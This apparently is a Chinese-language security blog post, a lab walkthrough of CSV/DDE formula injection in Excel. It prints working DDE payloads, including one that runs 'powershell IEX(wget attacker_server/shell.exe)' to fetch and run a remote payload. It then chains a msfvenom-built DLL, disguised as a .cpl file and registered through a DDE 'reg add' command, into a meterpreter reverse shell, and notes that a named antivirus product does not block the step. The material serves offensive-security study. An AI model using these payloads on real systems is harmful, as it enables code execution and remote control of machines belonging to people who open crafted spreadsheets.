<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-gi8DlR7Y7RsyN6H76Psdg)

何为 csv
======

**逗号分隔值**（Comma-Separated Values，**CSV**，有时也称为**字符分隔值**，因为分隔字符也可以不是逗号），其文件以纯文本形式存储表格数据（数字和文本）。纯文本意味着该文件是一个字符序列，不含必须像二进制数字那样被解读的数据。CSV 文件由任意数目的记录组成，记录间以某种换行符分隔；每条记录由字段组成，字段间的分隔符是其它字符或字符串，最常见的是逗号或制表符。通常，所有记录都有完全相同的字段序列。通常都是纯文本文件。建议使用 WORDPAD 或是记事本来开启，再则先另存新档后用 EXCEL 开启，也是方法之一。

csv 漏洞
======

csv 漏洞即攻击者通过在 CSV 文件中构造恶意的命令或函数，使得正常用户在使用 Excel 打开这个 CSV 文件后恶意的命令或函数被执行，从而造成攻击行为。

首先产生漏洞的第一个原因就是特殊符号

这里首先尝试在 excel 里面输入`=1+2`，回车过后发现 csv 自动帮我们运算出了结果

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkUKnMKzthicuhIbpgXepSZUmFYial7BOOK5lYW2QOUGicD5icZK9pjlAdjw/640?wx_fmt=png)

这里是因为在 csv 文件中`+、-、@、=`都会解释成公式，自动帮我们得出运算结果

第二个原因就是 DDE，DDE 是 Windows 下进程间通信协议，是一种动态数据交换机制，使用 DDE 通讯需要两个 Windows 应用程序，其中一个作为服务器处理信息，另外一个作为客户机从服务器获得信息。DDE 支持 Microsoft Excel，LibreOffice 和 Apache OpenOffice。Excel、Word、Rtf、Outlook 都可以使用这种机制，根据外部应用的处理结果来更新内容。因此，如果我们制作包含 DDE 公式的 CSV 文件，那么在打开该文件时，Excel 就会尝试执行外部应用。

这里首先尝试在 A1 单元格里面调用 cmd，填入命令`=1+cmd|'/C calc'!A0`并保存

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkkOt2r5mGicDriaObPAJlRUAB9xmfbQq4egEPGarO2icktd5Iez8dm2NwQ/640?wx_fmt=png)

然后重新打开会弹出一个框，这里为了漏洞复现，我们选择是

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHk8SAjKIf8DyfrT9g1SiaEcB6XamtkTkhChRdSpYvTdTA6y3n9FVyQCvw/640?wx_fmt=png)

继续点击更新

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkDQ4rAxngWw8lCxoV8un79HaDSejKdM0l7ob1Xqjvhv4mCgp9LpFn2Q/640?wx_fmt=png)

现在的 csv 好像已经默认禁用了 DDE，这里我们点确定

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkG8E69rMk8qHtdPbdqO5ddvoicoHG4fhibAAKuvUSRj2xtRXw04Uecc6A/640?wx_fmt=png)

点击启用内容

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHk2voJiceJWRGv9uST3y8ic4fX0v2M4ibMcoBCNC9knpnb2LUKcuxca2Gbw/640?wx_fmt=png)

cmd 就会调用 calc

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkGJe6bNml9acjENl7Rx4nLW3QvtL2EJiaugTbK857pTj7FLPmZxs2Krg/640?wx_fmt=png)

csv 注入
======

那么我们知道了 csv 产生的原因，这里我们就可以调用 cmd 执行我们的恶意代码，通过在 excel 表里面进行操作调用其他进程，例子如下

```
@SUM(1+1)*cmd|' /C calc'!A0=cmd|' /C notepad'!'A1'=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
```

cmd 后面跟的是命令，直接替换要执行的命令即可，如这里我要打开桌面的`demo.txt`

```
=SUM(1+1)*notepad|' C:\Users\61408\Desktop\demo.txt'!A0
```

保存并退出信任之后即可弹出

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkdWxWEhV9EZbSa6QBVibtXZWvrvweJgmvBmeXezvaqj5eJkX89FyS7YA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkic5m7pOib6gJLs8ORgjFMg8VHZiawMsANW3Q71GgknhMlh4DobN9zwUGA/640?wx_fmt=png)

csv 反弹 meterpreter
==================

kali 生成一个简单的弹 calc 的 dll，并将 dll 后缀名改为 cpl

```
msfvenom -p windows/exec CMD=calc.exe -f dll > hook.dllmv hook.dll hook.cpl
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkHQFNWDjPcR43TraFErBibBq4kyE56KjNGVpgN3Hq6tLRAh6KdelcQ9g/640?wx_fmt=png)

然后在 win7 里面设置一个共享文件夹把`hook.cpl`放入

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkg65EZzw4QZQHWtZQAQg7icxd16W6TekW9Fp07xcBALZMVPBa1rKswdQ/640?wx_fmt=png)

执行命令添加到注册表，这里 360 是不拦截的

```
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /t REG_SZ /d "\\Win7-2021EDCAZU\test\hook.cpl"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkwsXWdvFls6x5s7vhGpSgIgzqt7cMRAzpQQWia4B8E286Jx9Eic1SlILw/640?wx_fmt=png)

打开控制面板即可打开计算器

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkX9egC8ebLNeYOXt2SvfobtMG4oPGoauQxLV5xUVUdPU49yaPzic6yBw/640?wx_fmt=png)

使用 Procmon 跟踪进程发现控制面板会寻找这个注册表路径并加载里面的 cpl

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkCcc9zYIRSueNPgGafPCdBScqeSQcc4SvXT82SCyUHkq5n4DeYpqkibg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkOvZNhpojdybZCkmapO8OXtnb0wXcodBJIZ5srTG2WIHjXy3IfhRd5A/640?wx_fmt=png)

这里插一句何为 cpl 文件

> CPL 文件，又叫控制面板项（Control Panel Item），多保存于系统安装目录的 system32 文件夹下，它们分别对应着控制面板中的项目，普通用户的访问受到限制。它可由 shell32.dll、control.exe 打开。此外，你也可以直接在资源管理器中双击调用 Open 命令打开（实质上调用了 shell32.dll）。
> 
> CPL 文件本质是 Windows 可执行性文件，但不属于可以直接独立运行的文件，通常由 shell32.dll 打开。
> 
> system32 目录里绝大多数 cpl 文件是 Windows 系统文件，具有 “存档” 文件属性，Windows 操作系统的文件保护功能保护它们不被篡改。

实验结束，回到上一层话题，使用 xls 执行 cmd 命令添加这个注册表路径并执行控制面板获取 meterpreter

流程大概是这样的：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkm2TpaR04UWo8kY0RtIqPiarEcGr6UHEV0aNjt3panjicMobnNrcxq16Q/640?wx_fmt=png)

这里再生成一个反弹的 dll 并改名为 cpl(这里生成之后就直接放过去了，忘记改名了，是说一直实验不成功)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkmqhMBu6EARSJA8bbV5u9pkEiaHaoicgkJ5HOtia3CbK9uSk0qQeBr4G4Q/640?wx_fmt=png)

放到共享文件夹里面

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkMu5pQqaNo4jYuduyYAjibiau0x4vichN71dPadneGibflvCj4vCVFN3JUA/640?wx_fmt=png)

msf 开启监听

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkd63fXV8Sn6q5Gic6R5icrVhZ1RNmAowibZ7E1BougAySazaMKCib4MH7Sg/640?wx_fmt=png)

这里实验的时候发现一个问题，因为我是 win7 开的共享准备在 2008 里面添加 cpl，但是我 2008 里面安装不了 office，于是我就换了一下，但是我发现不同的系统 cpl 文件的路径不同，有的甚至没有这个文件夹

2008 是正常的

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHk0ibFpQEfnXqOibGabuvH4jNDOvItyiadyvIWbjhqtia0eOoePrLJZibDXNg/640?wx_fmt=png)

然后我换到 win7 里面发现根本就没有这个文件夹

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkHNbgpH30S3Ypz97aBcVicggFkxst4Xm4qWrKgLhYgttG5fRt2I8Obuw/640?wx_fmt=png)

win10 也是如此

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkFOqBV4oxiaZmTkjEjU2iaFJvnajGVqWVIYNBFJW0s4tSdoE7bPmVz6yw/640?wx_fmt=png)

再找了台域内的 win7 直接连`Controls Folder`这个文件夹都没有，好家伙

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkkNktHpDMhoygwl2nqqRJAhGGSWljjYgWyZuEY6r202DnF3PJsaOShA/640?wx_fmt=png)

这里我直接执行命令的话是不成功的，这里我就手动添加了`Control Panel\Cpls`这个路径

```
=cmd|' /C reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /t REG_SZ /d "\\WIN-339FINFSV15\testcpl\hook.cpl"'!_xlbgnm.A1
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkXdeiaPFBgaf71yv54edauIyCUfQ4icLeFabENUzLRy8xChM2nhZcBK5Q/640?wx_fmt=png)

然后打开控制面板

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkje6J9lr3hRfxpwYWohny3jgrCnJ7hibNYB18t4s7k14GPDxzAQCzBicw/640?wx_fmt=png)

即可得到反弹的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8zGbcYUAHtjzfAhUt4UBHkmicf5rNtfuSYPSiazLXdYdbFhYeXpEMBgsTLvmAHsEnVQ02nl9X7YKRw/640?wx_fmt=png)

后记
==

关于`Control Panel\Cpls`这个路径在不同系统中不同情况的问题，我百度并没有找到能够揭开我疑惑的答案，如果有知道为什么的师傅还请不吝赐教。

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**阅读推荐**

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibIa2klAoaNR0ichW7Ak5mhN2MFGFGics1wImJ2ZVQ5W0trkdTzVjFGKyesc4x2M50cY59yxibicGYBSA/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247500257&idx=1&sn=79f43d45cff440649a93bda832605e04&chksm=ec1c94dedb6b1dc8a5b88559581be1fe832b140f1c2beea090ad38d1193a568048b0f8279506&scene=21#wechat_redirect)

**点赞    在看    评论**

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)